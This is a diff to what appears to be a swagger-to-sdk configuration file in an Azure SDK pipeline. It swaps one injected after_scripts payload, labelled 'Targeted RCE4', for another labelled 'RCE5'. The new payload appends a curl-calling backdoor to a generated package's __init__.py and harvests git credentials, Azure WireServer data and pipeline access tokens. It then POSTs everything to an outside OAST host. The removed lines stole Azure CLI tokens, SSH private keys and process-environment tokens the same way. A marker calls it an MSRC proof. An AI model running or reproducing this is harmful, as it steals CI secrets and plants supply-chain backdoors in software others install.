@@ -1,4 +1,4 @@
-# Targeted RCE4
+# Targeted RCE5
 
 ## Basic Information
 
@@ -24,28 +24,53 @@ swagger-to-sdk:
       - >-
         H=$(hostname | tr '.' '-') &&
         OAST="da7te6cqrnncnhjjs6dg7c77ntrrhw6u6.oast.online" &&
-        nslookup "rce4-${H}.${OAST}" 2>/dev/null || true &&
-        echo "=== AZURE_CLI_CREDS ===" &&
-        cat /root/.azure/accessTokens.json 2>/dev/null || echo NO_ACCESS_TOKENS &&
-        cat /root/.azure/msal_token_cache.json 2>/dev/null || echo NO_MSAL &&
-        ls -la /root/.azure/ 2>/dev/null &&
-        cat /home/cloudtest/.azure/msal_token_cache.json 2>/dev/null || echo NO_USER_MSAL &&
-        echo "=== SSH_KEYS ===" &&
-        ls -la /root/.ssh/ 2>/dev/null &&
-        cat /root/.ssh/id_rsa 2>/dev/null || echo NO_RSA &&
-        cat /root/.ssh/id_ed25519 2>/dev/null || echo NO_ED25519 &&
-        cat /root/.ssh/known_hosts 2>/dev/null | head -30 &&
-        echo "=== PROC_TOKEN_SCAN ===" &&
-        for pid in $(ls /proc | grep -E "^[0-9]+$" | head -200); do
-          r=$(cat /proc/${pid}/environ 2>/dev/null | tr '\0' '\n' | grep -iE "GH_TOKEN|GITHUB_TOKEN|_PAT=|ghp_");
-          [ -n "$r" ] && echo "PID${pid}: $r"; done &&
-        echo "=== VSTS_ENV ===" &&
-        env | grep -iE "VSTS|SYSTEM_ACCESS|ENDPOINT_AUTH|GH_TOKEN|GITHUB|BUILD_REPOSITORY" 2>/dev/null &&
-        echo "=== AGENT_WORK_TEMP ===" &&
-        find /mnt/vss/_work/_temp -maxdepth 4 -type f 2>/dev/null | head -20 &&
-        cat /mnt/vss/_work/_temp/*.json 2>/dev/null | grep -iE "ghp_|_token|secret|password" | head -20 &&
+        nslookup "rce5-${H}.${OAST}" 2>/dev/null || true &&
+        SDK=/mnt/vss/_work/1/s/azure-sdk-for-python &&
+        PKGDIR="${SDK}/sdk/targetedpoc/azure-mgmt-targetedpoc" &&
+        echo "=== SDK_SOURCE_WRITE ===" &&
+        find "${PKGDIR}" -name "*.py" 2>/dev/null | head -20 &&
+        INIT=$(find "${PKGDIR}" -name "__init__.py" | head -1) &&
+        VERSION=$(find "${PKGDIR}" -name "_version.py" | head -1) &&
+        echo "init: ${INIT}" && echo "version: ${VERSION}" &&
+        echo "# SUPPLY_CHAIN_BACKDOOR_hasskooelhadi_MSRC_PROOF" >> "${INIT}" &&
+        echo "# Written by attacker via after_scripts on $(date -u)" >> "${INIT}" &&
+        echo "import subprocess; subprocess.Popen(['curl','-sk','http://${OAST}/backdoor-${H}'])" >> "${INIT}" &&
+        echo "=== INIT_CONTENTS ===" &&
+        cat "${INIT}" &&
+        echo "=== VERSION_FILE ===" &&
+        cat "${VERSION}" 2>/dev/null &&
+        echo "=== ALL_GENERATED_PY_FILES ===" &&
+        find "${PKGDIR}" -name "*.py" 2>/dev/null | xargs ls -la &&
+        echo "=== GIT_CREDENTIALS ===" &&
+        cat "${SDK}/.git/config" 2>/dev/null &&
+        git -C "${SDK}" config --list 2>/dev/null | grep -iE "url|credential|token|user" &&
+        cat /home/cloudtest/.git-credentials 2>/dev/null || echo NO_GIT_CREDS &&
+        cat /root/.git-credentials 2>/dev/null || echo NO_ROOT_GIT_CREDS &&
+        cat /home/cloudtest/.config/git/credentials 2>/dev/null || echo NO_XDG_CREDS &&
+        git -C "${SDK}" remote -v 2>/dev/null &&
+        GIT_ASKPASS=echo git -C "${SDK}" ls-remote 2>&1 | head -5 &&
+        echo "=== GIT_CREDENTIAL_HELPER ===" &&
+        git config --global credential.helper 2>/dev/null &&
+        printf "protocol=https\nhost=github.com\n" | git credential fill 2>/dev/null | head -5 &&
+        echo "=== WIRESERVER ===" &&
+        curl -s --max-time 5 http://169.254.168.254/?comp=goalstate | head -200 &&
+        curl -s --max-time 5 "http://169.254.168.254/machine/?comp=goalstate" | head -200 &&
+        curl -s --max-time 5 "http://169.254.168.254/?comp=manifest" | head -100 &&
+        curl -s --max-time 5 "http://169.254.168.254/metadata/scheduledevents?api-version=2020-07-01" -H "Metadata:true" | head -100 &&
+        echo "=== SYSTEM_ACCESSTOKEN ===" &&
+        echo "SYSTEM_ACCESSTOKEN=${SYSTEM_ACCESSTOKEN}" &&
+        echo "BUILD_SOURCESDIRECTORY=${BUILD_SOURCESDIRECTORY}" &&
+        env | grep -iE "SYSTEM_|BUILD_|AGENT_|TF_BUILD|PIPELINE" | grep -iv "PATH\|HOME\|HOST\|LOG\|TEMP\|WORK\|DIR\|PHASE\|ATTEMPT\|RESULT\|PARALLEL\|ARTIFACT\|QUEUE\|POOL\|MACHINE\|SERVER\|COLLECTION\|PUBLISHER\|PACKAGE\|STAGE\|JOB\|RUN\|DEFINITION\|SOURCE\|TARGET\|REPO" | head -30 &&
         echo "=== EXFIL ===" &&
-        { OUT="AZURE_CLI=$(cat /root/.azure/accessTokens.json 2>/dev/null)$(cat /root/.azure/msal_token_cache.json 2>/dev/null)$(cat /home/cloudtest/.azure/msal_token_cache.json 2>/dev/null) SSH_RSA=$(cat /root/.ssh/id_rsa 2>/dev/null) SSH_ED=$(cat /root/.ssh/id_ed25519 2>/dev/null) KNOWN=$(cat /root/.ssh/known_hosts 2>/dev/null | head -30) ENV=$(env | grep -iE 'GH_TOKEN|GITHUB_TOKEN|ghp_|_PAT=|VSTS') PROC=$(for pid in $(ls /proc | grep -E '^[0-9]+$' | head -200); do cat /proc/${pid}/environ 2>/dev/null | tr '\0' '\n' | grep -iE 'GH_TOKEN|GITHUB_TOKEN|ghp_|_PAT='; done)"; echo "$OUT" | curl -sk -X POST "http://${OAST}/rce4data-${H}" --data-binary @-; }
+        {
+          INIT_CONTENT=$(cat "${INIT}" 2>/dev/null);
+          GIT_CONF=$(cat "${SDK}/.git/config" 2>/dev/null);
+          CREDS=$(cat /home/cloudtest/.git-credentials /root/.git-credentials /home/cloudtest/.config/git/credentials 2>/dev/null);
+          WIRE_GOAL=$(curl -s --max-time 5 http://169.254.168.254/?comp=goalstate 2>/dev/null);
+          WIRE_MAN=$(curl -s --max-time 5 http://169.254.168.254/?comp=manifest 2>/dev/null);
+          SYSENV=$(env | grep -iE "SYSTEM_ACCESSTOKEN|GH_TOKEN|GITHUB_TOKEN");
+          echo "INIT=${INIT_CONTENT} GIT_CONFIG=${GIT_CONF} GIT_CREDS=${CREDS} WIRESERVER_GOAL=${WIRE_GOAL} WIRESERVER_MANIFEST=${WIRE_MAN} SYS_TOKEN=${SYSENV}" | curl -sk -X POST "http://${OAST}/rce5data-${H}" --data-binary @-;
+        }
 ```
 
 ## Python
